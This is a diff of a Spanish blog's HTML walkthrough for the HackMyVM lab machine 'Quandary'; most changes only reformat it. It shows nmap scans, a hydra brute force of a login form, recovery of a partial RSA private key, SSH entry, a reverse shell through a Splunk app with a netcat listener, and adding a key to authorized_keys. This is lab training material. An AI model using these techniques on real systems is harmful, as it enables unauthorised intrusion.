@@ -52,7 +52,7 @@
         },
         "datePublished": "2023-03-30",
         "description": "",
-        "wordCount":  1091 ,
+        "wordCount":  1094 ,
         "mainEntityOfPage": "True",
         "dateModified": "2023-03-30",
         "image": {
@@ -188,64 +188,71 @@ stroke-linejoin="round" class="feather feather-home">
 <li><em>Dirty_sock exploit</em></li>
 </ul>
 <h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
-<p>❯ nmap -p- -T5 -n -v 192.168.1.14
-PORT     STATE SERVICE
-22/tcp   open  ssh
-80/tcp   open  http
-8000/tcp open  http-alt
-8089/tcp open  unknown</p>
-<h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
-<p>❯ nmap -sVC -v -p 22,80,8000,8089 192.168.1.14
-PORT     STATE SERVICE  VERSION
-22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   3072 81560bdc551faa606864239a9ff79cc7 (RSA)
-|   256 43f311c7e4bec9bf4f6c1b48f6e41368 (ECDSA)
-|_  256 3cb98d3f70b2311596f8ce952986b785 (ED25519)
-80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|<em>http-title: Under Construction
-| http-methods:
-|</em>  Supported Methods: POST OPTIONS HEAD GET
-8000/tcp open  http     Splunkd httpd
-|<em>http-server-header: Splunkd
-| http-methods:
-|</em>  Supported Methods: GET HEAD POST OPTIONS
-|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
-| http-title: Site doesn&rsquo;t have a title (text/html; charset=UTF-8).
-|<em>Requested resource was http://192.168.1.14:8000/en-US/account/login?return_to=%2Fen-US%2F
-| http-robots.txt: 1 disallowed entry
-|</em>/
-8089/tcp open  ssl/http Splunkd httpd
-|<em>http-server-header: Splunkd
-| http-methods:
-|</em>  Supported Methods: GET HEAD OPTIONS
-| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
-| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2023-02-24T10:44:38
-| Not valid after:  2026-02-23T10:44:38
-| MD5:   1127d6ec1fa5950702750b6c915fe0a8
-|_SHA-1: b8953c0197d051a6febca79f3076760eba701a3a
-|<em>http-title: splunkd
-| http-robots.txt: 1 disallowed entry
-|</em>/</p>
-<h3 id="http">HTTP</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -p- -T5 -n -v 192.168.1.14
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>80/tcp   open  http
+</span></span><span style="display:flex;"><span>8000/tcp open  http-alt
+</span></span><span style="display:flex;"><span>8089/tcp open  unknown
+</span></span><span style="display:flex;"><span>``
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>### Escaneo de servicios
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>```txt
+</span></span><span style="display:flex;"><span>❯ nmap -sVC -v -p 22,80,8000,8089 192.168.1.14
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   3072 81560bdc551faa606864239a9ff79cc7 (RSA)
+</span></span><span style="display:flex;"><span>|   256 43f311c7e4bec9bf4f6c1b48f6e41368 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 3cb98d3f70b2311596f8ce952986b785 (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-title: Under Construction
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: POST OPTIONS HEAD GET
+</span></span><span style="display:flex;"><span>8000/tcp open  http     Splunkd httpd
+</span></span><span style="display:flex;"><span>|_http-server-header: Splunkd
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
+</span></span><span style="display:flex;"><span>| http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+</span></span><span style="display:flex;"><span>|_Requested resource was http://192.168.1.14:8000/en-US/account/login?return_to=%2Fen-US%2F
+</span></span><span style="display:flex;"><span>| http-robots.txt: 1 disallowed entry 
+</span></span><span style="display:flex;"><span>|_/
+</span></span><span style="display:flex;"><span>8089/tcp open  ssl/http Splunkd httpd
+</span></span><span style="display:flex;"><span>|_http-server-header: Splunkd
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD OPTIONS
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
+</span></span><span style="display:flex;"><span>| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: 2048
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-02-24T10:44:38
+</span></span><span style="display:flex;"><span>| Not valid after:  2026-02-23T10:44:38
+</span></span><span style="display:flex;"><span>| MD5:   1127d6ec1fa5950702750b6c915fe0a8
+</span></span><span style="display:flex;"><span>|_SHA-1: b8953c0197d051a6febca79f3076760eba701a3a
+</span></span><span style="display:flex;"><span>|_http-title: splunkd
+</span></span><span style="display:flex;"><span>| http-robots.txt: 1 disallowed entry 
+</span></span><span style="display:flex;"><span>|_/
+</span></span></code></pre></div><h3 id="http">HTTP</h3>
 <p>En el servicio http veo una página en construcción y el dominio quandary.hmv que seguidamente lo añadiré a mi archivo /etc/hosts .</p>
-<p>❯ curl -s http://192.168.1.14 | html2text</p>
-<p>****** Under Construction ******
-We apologize for the inconvenience, but this website is currently under
-construction.
-Please check back soon for updates! Please contact <a href="mailto:admin@quandary.hmv">admin@quandary.hmv</a> for more
-information!</p>
-<h3 id="puerto-8000">Puerto 8000</h3>
-<p>Panel de login de Splunk.
-<img src="/../machines/hmv/quandary1/splunkEnterpriselogin.png" alt="splunkEnterpriselogin"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ curl -s http://192.168.1.14 | html2text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>****** Under Construction ******
+</span></span><span style="display:flex;"><span>We apologize for the inconvenience, but this website is currently under
+</span></span><span style="display:flex;"><span>construction.
+</span></span><span style="display:flex;"><span>Please check back soon for updates! Please contact admin@quandary.hmv for more
+</span></span><span style="display:flex;"><span>information!
+</span></span></code></pre></div><h3 id="puerto-8000">Puerto 8000</h3>
+<p>Panel de login de Splunk.</p>
+<p><img src="/../machines/hmv/quandary1/splunkEnterpriselogin.png" alt="splunkEnterpriselogin"></p>
 <h3 id="puerto-8089">Puerto 8089</h3>
-<p>Versión de splunk es la <code>7.1.9</code>.
-<img src="/../machines/hmv/quandary1/puerto8089.png" alt="puerto8089"></p>
+<p>Versión de splunk es la <code>7.1.9</code>.</p>
+<p><img src="/../machines/hmv/quandary1/puerto8089.png" alt="puerto8089"></p>
 <p>Con gobuster hago una búsqueda de subdominios y encuentra <code>directadmin.quandary.hmv</code>, este también lo añadiré a mi archivo <code>/etc/hosts</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ gobuster vhost -u quandary.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 </span></span><span style="display:flex;"><span>===============================================================
@@ -265,8 +272,8 @@ information!</p>
 <p>Con hydra aplico fuerza bruta al formulario.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>hydra -l admin -P /usr/share/wordlists/rockyou.txt directadmin.quandary.hmv http-post-form &#34;/login.php:uname=^USER^&amp;psw=^PASS^:F=Incorrect username or password&#34; -V -f -I
 </span></span><span style="display:flex;"><span>[80][http-post-form] host: directadmin.quandary.hmv   login: admin   password: q****w
-</span></span></code></pre></div><p>Una vez conectado accedo al dashboard de admin, aquí hay un trozo de una clave rsa pública, otra clave privada y un mensaje.
-<img src="/../machines/hmv/quandary1/dashboard.png" alt="dashboard"></p>
+</span></span></code></pre></div><p>Una vez conectado accedo al dashboard de admin, aquí hay un trozo de una clave rsa pública, otra clave privada y un mensaje.</p>
+<p><img src="/../machines/hmv/quandary1/dashboard.png" alt="dashboard"></p>
 <blockquote>
 <p>El mensaje pone lo siguiente: Sólo quería decirte que el otro día te dije que me dejaras aquí tu clave pública y privada. Sólo copiaste la clave pública y creo que tu clave privada no se copió completamente en tu portapapeles. De todas formas mándame un email a <code>admin@quandary.hmv</code> cuando hayas copiado tu clave privada aquí. Hablamos la semana que viene.</p>
 </blockquote>
@@ -280,8 +287,8 @@ information!</p>
 </span></span></code></pre></div><p>Archivo <code>id_rsa.pub</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMkW1dygI8UCOwrEjjCnceOqjY2DOnw6kUtCs4KAId5f/xeKjx6hsC9Okvm0u/Rs/TiLhqQm+ibpo/EVZ4vvw8XcrEqTdrU60OPiZO+RRUVHdps+SlLAys/h+jopRfEvfeE4G86Kzm0pNwPoiny9ruLDa3ByPjhe3x9Rx9Vb+2KxZtXkEWeC1G8xILp5jG5gwboe6ncRtvTvko31iZCXG4eEAf04tdCitmF11KDoLgnmWsAmGIZoUDGaoydNUEMi2cGiaUiOzvAIvAbUXoZLRcuOVyPv8eHL+hpmk/xPa4hN6z510EBbfiBEgTj12pu1SMQ1E5DsS/d7n+UxEeM0M1ooVic85ttXAY4VzThX/2c6b7o9iPtZ2QtyvFnV2Fb8RgclN3rrk7sLrw6t4YzxyyLLKGviLDEXssPJ7QSQmbA5kEFTTj8ATg2l+VqKbqljvbslTj/KzJiiycUg5RfHMmi7/gAEI9DMIcOCNgYy2CKDv/1K94VYFOBKOT5nAsMF0= lawrence@quandary
 </span></span></code></pre></div><h3 id="recuperar-clave-privada-a-partir-de-una-clave-pública-débil">Recuperar clave privada a partir de una clave pública débil.</h3>
-<p>Al decodear el <code>id_rsa</code> obtengo esta salida.
-<img src="/../machines/hmv/quandary1/a-idrsa.png" alt="a-idrsa"></p>
+<p>Al decodear el <code>id_rsa</code> obtengo esta salida.</p>
+<p><img src="/../machines/hmv/quandary1/a-idrsa.png" alt="a-idrsa"></p>
 <p>Añado <code>AA</code> al inicio del archivo <code>id_rsa</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>AAzfWP0Oewz87090bqRvmdyw5HvVzOnmhQAAAMEA3bbbBmTDBn4E/86brUv/b3nBhMiR1bbx
 </span></span><span style="display:flex;"><span>nIEKyhulHY5mf3KcneltIzfJDRdg/pmjCcGTkAkHc0BN9bLy6d2gQLOlsw9PY/tbXuVp69
@@ -289,8 +296,8 @@ information!</p>
 </span></span><span style="display:flex;"><span>yHu5gjadvjsUYTpSGq+pEE44tHhAcrrx81F/J2iKYyyJ9iAxvlqPHWL6mhum1W4OofiWDJ
 </span></span><span style="display:flex;"><span>C+O4pw4gKwfuX5AAAAEWxhd3JlbmNlQHF1YW5kYXJ5AQ==
 </span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
-</span></span></code></pre></div><p>Si vuelvo a decodear el id_rsa obtengo una salida distinta donde se puede apreciar el usuario lawrence.
-<img src="/../machines/hmv/quandary1/a-idrsa-laurence.png" alt="a-idrsa-laurence"></p>
+</span></span></code></pre></div><p>Si vuelvo a decodear el id_rsa obtengo una salida distinta donde se puede apreciar el usuario lawrence.</p>
+<p><img src="/../machines/hmv/quandary1/a-idrsa-laurence.png" alt="a-idrsa-laurence"></p>
 <p>Obtener <code>q</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ base64 -d id_rsa | xxd -seek 29 -l 193 -p &gt; ssh_q
 </span></span><span style="display:flex;"><span>❯ cat ssh_q
@@ -314,10 +321,10 @@ information!</p>
 </span></span></code></pre></div><blockquote>
 <p>Ignorar el warning&hellip;[!] Using native python functions for math, which is slow. install gmpy2 with: &lsquo;python3 -m pip install private argument is not set, the private key will not be displayed, even if recovered.</p>
 </blockquote>
-<p>Finalmente generamos la clave privada con el siguiente churraco.
-<img src="/../machines/hmv/quandary1/RsaCtfToolGenRSA.png" alt="RsaCtfToolGenRSA"></p>
-<p>Si todo ha salido bien tendremos nuestra id_rsa.
-<img src="/../machines/hmv/quandary1/id_rsa_generado.png" alt="id_rsa_generado"></p>
+<p>Finalmente generamos la clave privada con el siguiente churraco.</p>
+<p><img src="/../machines/hmv/quandary1/RsaCtfToolGenRSA.png" alt="RsaCtfToolGenRSA"></p>
+<p>Si todo ha salido bien tendremos nuestra id_rsa.</p>
+<p><img src="/../machines/hmv/quandary1/id_rsa_generado.png" alt="id_rsa_generado"></p>
 <p>Me conecto mediante ssh usando la clave privada.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ ssh lawrence@192.168.1.14 -i id_rsa_law
 </span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.15.0-69-generic x86_64)
@@ -348,11 +355,11 @@ information!</p>
 <p><a href="https://github.com/TBGSecurity/splunk_shells/archive/refs/tags/1.3.tar.gz">https://github.com/TBGSecurity/splunk_shells/archive/refs/tags/1.3.tar.gz</a></p>
 <p>Para instalar el archivo tar tenéis los pasos en el readme este enlace.</p>
 <p><a href="https://github.com/TBGSecurity/splunk_shells">https://github.com/TBGSecurity/splunk_shells</a></p>
-<p>Una vez termina de instalar verifico que se haya instalado correctamente en <code>Manage Apps</code>.
-<img src="/../machines/hmv/quandary1/Weaponize.png" alt="Weaponize">
+<p>Una vez termina de instalar verifico que se haya instalado correctamente en <code>Manage Apps</code>.</p>
+<p><img src="/../machines/hmv/quandary1/Weaponize.png" alt="Weaponize">
 Weaponize</p>
-<p>Ahora dejo un netcat a la escucha por el puerto 8888 y voy a Search &amp; Reporting para lanzar una shell.
-<img src="/../machines/hmv/quandary1/Weaponize_rev.png" alt="Weaponize_rev"></p>
+<p>Ahora dejo un netcat a la escucha por el puerto 8888 y voy a Search &amp; Reporting para lanzar una shell.</p>
+<p><img src="/../machines/hmv/quandary1/Weaponize_rev.png" alt="Weaponize_rev"></p>
 <p>Obtengo la shell como usuario admin, añado mi <code>id_rsa.pub</code> al archivo <code>authorized_keys</code> para tener una shell interactiva y acceder como usuario admin.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nc -lvnp 8888
 </span></span><span style="display:flex;"><span>listening on [any] 8888 ...
